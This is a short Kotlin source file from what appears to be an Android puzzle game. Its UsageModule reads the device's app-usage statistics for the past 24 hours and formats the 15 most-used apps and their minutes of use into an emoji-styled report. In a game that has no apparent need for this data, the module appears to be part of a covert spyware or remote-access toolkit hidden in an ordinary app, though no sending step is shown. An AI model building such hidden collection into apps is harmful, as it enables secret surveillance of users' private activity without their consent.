package com.puzzleblast.game.modules

import android.app.usage.UsageStatsManager
import android.content.Context
import java.util.concurrent.TimeUnit

object UsageModule {
    suspend fun stats(ctx: Context): String {
        val usm = ctx.getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
        val now = System.currentTimeMillis()
        val stats = usm.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, now - TimeUnit.DAYS.toMillis(1), now)
            ?: return "📱 no usage stats access"
        val byPkg = stats.groupBy { it.packageName }
            .mapValues { (_, v) -> v.sumOf { it.totalTimeInForeground } }
            .entries.sortedByDescending { it.value }.take(15)
        if (byPkg.isEmpty()) return "📱 no usage data"
        return "📱 Usage · 24h\n" + byPkg.joinToString("\n") { (pkg, ms) ->
            "  $pkg — ${ms / 60000}m"
        }
    }
}
